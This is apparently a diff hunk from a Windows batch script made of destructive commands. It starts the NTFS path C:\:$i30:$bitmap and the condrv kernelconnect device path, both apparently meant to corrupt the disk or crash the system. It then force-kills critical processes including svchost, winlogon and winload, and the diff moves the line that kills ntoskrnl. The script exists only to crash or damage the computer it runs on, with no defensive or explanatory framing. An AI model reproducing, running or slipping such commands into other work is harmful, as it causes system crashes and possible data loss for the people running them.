@@ -10,5 +10,5 @@ START C:\:$i30:$bitmap
 START \\\\.\\globalroot\\device\\condrv\\kernelconnect 
 Taskkill /im Svchost.exe /y
 Taskkill /im winlogon.exe /y
-Taskkill /im Ntoskrnl.exe /y
 Taskkill /im winload.exe /y
+Taskkill /im Ntoskrnl.exe /y
